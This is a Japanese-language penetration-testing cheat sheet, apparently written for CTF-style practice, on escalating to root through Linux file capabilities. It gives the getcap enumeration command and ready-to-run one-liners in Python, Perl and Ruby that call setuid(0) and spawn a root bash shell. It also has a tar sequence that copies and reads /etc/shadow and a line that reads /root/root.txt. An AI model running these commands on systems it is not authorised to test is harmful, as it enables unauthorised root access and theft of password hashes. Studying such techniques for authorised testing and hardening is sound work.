# Linux Capabilities による権限昇格

## 概要

Linux Capabilities は root 権限を細分化した仕組み。特定の Capability が付与されたバイナリは、非特権ユーザーが実行しても root 相当の特定操作が実行できる。SUID より見落とされやすいため優先して確認する。

---

## 着火条件

`getcap -r / 2>/dev/null` の出力に、スクリプト言語（python, perl, ruby等）または標準コマンドへの Capability 付与が見つかった場合。

---

## 観点・着眼点

**`cap_setuid` が最も危険：**
`setuid(0)` を呼び出すことで、そのプロセスの UID を root (0) に変更できる。スクリプト言語に付与されている場合は即座に root シェルを取れる。

**確認コマンド：**
```bash
getcap -r / 2>/dev/null
```

**典型的な危険な出力例：**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/perl = cap_setuid+eip
/usr/bin/ruby2.7 = cap_setuid+eip
/usr/bin/vim.basic = cap_setuid+eip
```

---

## 悪用手順

### Python で cap_setuid を悪用

```bash
# UID を 0(root) に変更してシェルを起動
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# または特定コマンドを実行
python3 -c "import os; os.setuid(0); os.system('id')"
python3 -c "import os; os.setuid(0); os.system('cat /root/root.txt')"
```

### Perl で cap_setuid を悪用

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Ruby で cap_setuid を悪用

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### tar で cap_dac_read_search を悪用

```bash
# パーミッションに関わらず任意ファイルを読める
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow
```

---

## Capabilities の意味一覧

| Capability | 権限の内容 |
|-----------|-----------|
| `cap_setuid` | 任意のUIDに変更可能 → **root昇格** |
| `cap_setgid` | 任意のGIDに変更可能 |
| `cap_net_bind_service` | 1024以下のポートにバインド可能（比較的安全） |
| `cap_net_raw` | RAWソケットの使用、パケットキャプチャ |
| `cap_dac_override` | ファイルパーミッションを無視して読み書き |
| `cap_dac_read_search` | ファイルパーミッションを無視して読み取り・ディレクトリ検索 |
| `cap_sys_ptrace` | プロセスへの ptrace アタッチ |
| `cap_sys_admin` | 非常に広範な特権操作 |

---

## GTFOBins での確認

GTFOBins (https://gtfobins.github.io/) の「Capabilities」フィルターで対象バイナリを検索すると悪用コマンドが確認できる。

---

## 注意点・落とし穴

- `getcap` コマンド自体がないシステムでは `/proc/[PID]/status` で確認が必要
- `+eip` は Effective・Inheritable・Permitted の略。`+ep` でも悪用可能
- `cap_net_bind_service` 単体では権限昇格に直接使えないが、他の Capability と組み合わさっている場合は注意

---

## 関連技術
- GTFOBins: https://gtfobins.github.io/
- SUID も確認 → `SUID_SGID.md`
